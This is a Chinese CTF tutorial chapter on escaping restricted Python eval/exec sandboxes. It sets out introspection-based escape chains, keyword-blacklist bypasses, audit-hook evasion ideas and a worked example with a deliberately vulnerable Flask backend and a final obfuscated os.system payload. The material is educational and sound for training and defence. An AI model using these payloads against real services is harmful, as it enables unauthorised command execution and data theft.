---
comments: true
---

# Python沙箱逃逸

在 CTF 的 Web 题里，经常会遇到一种「看起来能执行任意 Python 代码、实际上处处受限」的题目：服务器给你一个输入框，把你输入的内容丢进 `eval()` 或 `exec()` 执行，但又禁用了 `import`、`open`、`os` 等关键字。这类题就是 **Python 沙箱逃逸（Python Sandbox Escape）**。本章面向初学者，讲清它的原理和最常用的几条逃逸链，最后用一道典型例题走一遍完整流程。

## 什么是 Python 沙箱题

Python 是一门高度动态、自省能力极强的语言：任何对象都能查到自己的类，任何类都能查到自己的父类和子类，甚至能在运行期动态生成代码。这意味着，只要攻击者能在目标进程里执行 **哪怕一个表达式**，就有机会顺着对象体系爬到解释器的任意角落，最终拿到 `os.system` 之类的能力。

出题人为了不让选手"一步到位"，通常会构造一个受限环境，常见手段有：

- 只允许 `eval()`（只能执行单个表达式，不能写语句）；
- 用正则黑名单过滤 `import`、`os`、`open`、`system` 等关键字；
- 执行前清空 `__builtins__`，让你连 `print` 都用不了；
- 把代码放进 `exec(code, {"__builtins__": {}})` 这样的"空"命名空间里执行。

一个最简的沙箱题后端大概长这样：

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/calc", methods=["POST"])
def calc():
    expr = request.form.get("expr", "")
    blacklist = ["import", "os", "open", "eval", "exec", "__"]
    for word in blacklist:
        if word in expr:
            return "hacker!"
    return str(eval(expr, {"__builtins__": {}}))
```

沙箱逃逸的目标就是：在这些限制下，仍然执行到 `os.system("cat /flag")` 或等价操作。

**安全提示：** 本章所有技巧仅用于 CTF 比赛与授权测试环境。`eval`/`exec` 直接处理用户输入本身就是严重漏洞（参见「RCE」一章），真实业务中绝不要这么写。

## 对象继承链基础

逃逸的核心工具是 Python 的对象继承链。先记住一句话：**在 Python 中万物皆对象，每个对象都能顺着属性找到它的类和所有兄弟类。**

关键的内省属性有三个：

| 属性 | 含义 |
| --- | --- |
| `__class__` | 对象的类 |
| `__base__` | 类的直接父类（顶层是 `object`） |
| `__subclasses__()` | 类的所有直接子类列表 |

动手试一下，感受这条链：

```python
>>> ''.__class__
<class 'str'>
>>> ''.__class__.__base__
<class 'object'>
>>> ''.__class__.__base__.__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, ...]
```

最后一步返回的列表通常有上百项——它们是解释器启动时已经加载的 **所有类**。只要其中某个类（或它的方法）内部引用了 `os`、`sys`、`builtins` 等模块，我们就能借它摸到这些模块。

由于题目经常过滤 `__`（双下划线），还要记住它的等价写法：

- `getattr(x, "__class__")`，字符串可以再拆成 `"__cla"+"ss__"` 绕过关键字过滤；
- `().__class__.__bases__[0]` 与 `__base__` 等价；
- `object.__subclasses__()` 可以从任何对象爬过去，例如 `().__class__.__base__.__subclasses__()`。

## 经典逃逸链讲解

拿到 `__subclasses__()` 的列表后，要在里面找一个"能带我们到危险模块"的类。CTF 中最经典的几条链如下。

### 借助 `os._wrap_close`

`os` 模块在初始化时会注册一个 `os._wrap_close` 类（继承自 `io.IOBase`），它的 `__init__` 函数的 `__globals__` 里保存着 `os` 模块的全局命名空间：

```python
import os

def search():
    for i, cls in enumerate(object.__subclasses__()):
        if cls.__name__ == "_wrap_close":
            return i
```

找到下标后（假设是 117，不同 Python 版本下标不同，**实际做题时必须先动态定位**）：

```python
payload = (
    "().__class__.__base__.__subclasses__()[117]"
    ".__init__.__globals__['system']('cat /flag')"
)
```

其中用到的新属性：

- `__init__`：类的构造方法，是一个函数对象；
- `__globals__`：函数所在模块的全局变量字典，`os._wrap_close.__init__.__globals__` 就包含 `system`、`popen` 等。

更稳的写法是不猜下标，直接在 payload 里搜索（只要沙箱允许写表达式）：

```python
payload = (
    "[c for c in ().__class__.__base__.__subclasses__() "
    "if c.__name__ == '_wrap_close'][0]"
    ".__init__.__globals__['system']('cat /flag')"
)
```

### 借助 `_frozen_importlib` 的 `BuiltinImporter`

Python 3 的解释器内部会加载 `_frozen_importlib`，其中存在 `BuiltinImporter` 类，它有 `load_module` 方法可以加载内置模块（`os` 就是内置模块之一，无需 `import` 语句）：

```python
payload = (
    "[c for c in ().__class__.__base__.__subclasses__() "
    "if c.__name__ == 'BuiltinImporter'][0]"
    ".load_module('os').system('cat /flag')"
)
```

注意 `_frozen_importlib` 在不同 Python 版本里类名和组织方式有变化（有的版本在 `BuiltinImporter` 外层还有一层），实战中以现场枚举为准。

### 用 `warnings.catch_warnings` 拿 builtins

`warnings.catch_warnings` 类的 `__init__.__globals__` 里有 `__builtins__`，可直接恢复内建函数：

```python
payload = (
    "[c for c in ().__class__.__base__.__subclasses__() "
    "if c.__name__ == 'catch_warnings'][0]"
    "()._module.__builtins__['__import__']('os').system('cat /flag')"
)
```

思路共通的还有：找任意函数对象的 `__globals__`（`__builtins__` 默认就在里面）、找已加载模块的 `sys.modules` 等。核心套路一句话：**枚举子类 → 找含目标模块引用的类 → 经 `__globals__`/`load_module` 拿到模块 → 调用 `system`/`popen`**。

## `__builtins__` 恢复与 import 绕过

很多沙箱的第一道防线是执行时传入 `{"__builtins__": {}}`，把内建函数全部掏空。这时 `import`、`open`、`eval` 都不存在了，但它们并没有消失——只是当前命名空间看不见而已。

恢复 `__builtins__` 的常见途径：

1. **从任意函数爬**：任何一个在"正常"模块里定义的函数，其 `__globals__['__builtins__']` 都是完整的内建集合。上面的 `catch_warnings` 链就是例子。
2. **从加载过的模块爬**：如果解释器已经 `import os` 过，`sys.modules['os']` 就直接可用：

   ```python
   [].__class__.__base__.__subclasses__()  # 先找能拿到 sys 的类
   ```

   拿到 `sys` 后 `sys.modules['os'].system('id')` 即可。

绕过「禁止 import 语句」的手段：

- `__builtins__['__import__']('os')` —— 用内建的 `__import__` 函数，不经过 `import` 关键字；
- `BuiltinImporter.load_module('os')` —— 上一节的链；
- 字符串变形绕过对 `import` 这个词的过滤：`__builtins__['__im'+'port__']('o'+'s')`。

## 常见过滤绕过

出题人通常会在 payload 上加一层字符串黑名单。以下是按出题频率排序的绕过手法，核心是：**黑名单匹配的是「字符串」，而 Python 有无数种方式在运行期拼出同一个字符串。**

### 字符拼接与反转

```python
"__cla"+"ss__"          # 拼接
"__ssalc__"[::-1]       # 反转
"o"+"s"                 # 模块名同样可拆
```

### `getattr` 替代点号访问

黑名单常过滤 `__class__` 这样的属性名，改用 `getattr` 后属性名变成普通字符串，再叠加拼接即可：

```python
getattr((), "__cla"+"ss__")
```

链式调用：

```python
getattr(getattr((), "__cla"+"ss__"), "__ba"+"se__")
```

### 编码绕过

- **十六进制 / 八进制转义**：`"\137\137class\137\137"` 即 `"__class__"`（`\137` 是八进制的 `_`）。
- **bytes 按 ASCII 码构造**：不让出现某些字符，就直接用码点拼出整个字符串：

  ```python
  getattr((), bytes([95,95,99,108,97,115,115,95,95]).decode())  # "__class__"
  ```

  若还能拿到 `codecs` 或 `base64` 模块，也可以 `codecs.decode("X19jbGFzc19f", "base64")` 这样整体解码，黑名单完全无感。

### 格式化字符串与 f-string

当题目禁止引号或某些字母时，可以用格式化从已有字符串里"取字"：

```python
"{c.__class__}".format(c=())      # str.format 触发属性访问
f"{().__class__}"                 # f-string 里可以直接写表达式
```

更进阶的是 `str.format` 直接访问下标和属性：`"{0.__class__.__base__}".format(())`，在 SSTI 场景（见「SSTI注入」一章，Jinja2 沙箱逃逸用的是同一套思路）中极其常用。

### 其他小技巧

- 过滤了 `()`？用 `[]`（列表）或 `{}`、`""` 起步，它们都能到 `object`。
- 过滤了 `.`？`getattr` 或者 `vars()`、`dir()` 组合。
- 过滤了数字下标？用 `pop()`、`index()` 或生成器表达式逐个判断 `__name__`。
- 过滤了引号？从文档字符串、错误信息里取字符，如 `().__doc__[1]`。

## audit hook（Python 3.8+）新考点简介

Python 3.8 引入了 **审计钩子（audit hook）** 机制：解释器在执行敏感操作（`os.system`、`open`、`import`、`compile` 等）之前会触发一个审计事件，注册了钩子的代码可以检查参数并 **抛出异常拒绝执行**：

```python
import sys

def hook(event, args):
    if event in ("os.system", "subprocess.Popen", "open"):
        raise RuntimeError(f"blocked: {event}")

sys.addaudithook(hook)
```

近三年越来越多的 CTF 沙箱题用它代替（或叠加）关键字黑名单，因为：

- 钩子注册后 **无法移除**（`addaudithook` 是单向的），逃逸者必须在「不触发被禁事件」的前提下完成目标，或者找到尚未被 hook 的等价路径；
- 它工作在 C 层事件上，`getattr`、字符拼接这些字符串层绕过对它无效——`os.system` 无论怎么拼出来，调用瞬间都会触发 `os.system` 事件。

面对 audit hook，常见思路是换事件类别：例如 `os.system` 被禁但 `os.exec*`、`os.spawn*`、`ctypes` 或文件描述符读写 `/proc/self/...` 没被禁；或者干脆不执行命令，改为用未被 hook 的 `open` 等价物（如 `io.open`、`codecs.open`、`pathlib.Path.read_text`）直接读 flag。做题时先用一段探针代码触发各事件，观察报错信息里钩子放行了什么。

## CTF 例题完整流程

**题目描述（虚构但高度典型）：** 某在线计算器，POST 参数 `expr` 会被 `eval()` 执行，黑名单过滤了 `import`、`os`、`open`、`system`、`flag` 和 `__`，且 `__builtins__` 被清空。

**第一步：摸清环境。** 先确认能执行表达式：

```http
POST /calc HTTP/1.1
Content-Type: application/x-www-form-urlencoded

expr=1%2B1
```

返回 `2`，确认是 `eval` 且回显结果。

**第二步：确认继承链可用。** 黑名单里有 `__`，所有双下划线属性都要变形。用 `getattr` + 拼接测试：

```python
expr=getattr('', '__cla'+'ss__')
```

返回 `<class 'str'>`，链可用。

**第三步：枚举子类，找 `_wrap_close`。** 由于回显只显示表达式结果，直接让 payload 返回目标类的下标：

```python
expr=[i for i,c in enumerate(getattr(getattr(getattr('','__cla'+'ss__'),'__ba'+'se__'),'__subcl'+'asses__')()) if c.__name__=='_wrap_close']
```

这里 `__name__` 也含 `__`，要改成 `getattr(c,'__na'+'me__')`。假设返回 `[117]`。

**第四步：构造读 flag 链。** `system` 和 `flag` 都在黑名单里，全部变形；同时 `os` 也被过滤，但 `'system'` 是字典键字符串，可拼接：

```python
expr=getattr([c for c in getattr(getattr(getattr('','__cla'+'ss__'),'__ba'+'se__'),'__subcl'+'asses__')() if getattr(c,'__na'+'me__')=='_wrap_close'][0].__init__,'__glob'+'als__')['sys'+'tem']('cat /fl'+'ag')
```

等一下——`__init__` 也带 `__`，同样要 `getattr(c, '__in'+'it__')`。整理后的最终 payload（URL 编码前）：

```python
expr=getattr(getattr([c for c in getattr(getattr(getattr('','__cla'+'ss__'),'__ba'+'se__'),'__subcl'+'asses__')() if getattr(c,'__na'+'me__')=='_wrap_close'][0],'__in'+'it__'),'__glob'+'als__')['sys'+'tem']('cat /fl'+'ag')
```

**第五步：发送并读 flag。** URL 编码后 POST，页面返回 `flag{pyth0n_0bject_cha1n_1s_p0werful}`。

**复盘要点：**

1. 黑名单过滤的是字符串，不是行为——一切被禁的词都能用拼接、`getattr`、编码重新造出来；
2. 下标不要硬编码，用列表推导按 `__name__` 动态搜索，跨 Python 版本也能用；
3. 如果题目禁了 `eval` 回显（盲打），把 `system` 换成 `curl` 外带，或把结果写进某个可访问的文件再读（结合「SSRF注入」「RCE」两章的外带思路）；
4. 如果题目用了 audit hook，先探明被禁事件列表，再换未被 hook 的等价函数。

## 小结

Python 沙箱逃逸的本质是一场「自省能力 vs 限制手段」的对抗：解释器给的元信息越多，逃逸链就越多；出题人封得越靠底层（如 audit hook），绕过就越需要换思路而非换拼写。掌握 `__class__ → __base__ → __subclasses__ → __globals__` 这条主干，再加上字符串变形三板斧（拼接、`getattr`、编码），足以应付绝大多数 CTF 沙箱题。相关思路与「SSTI注入」章节的模板沙箱逃逸一脉相承，建议对照阅读。
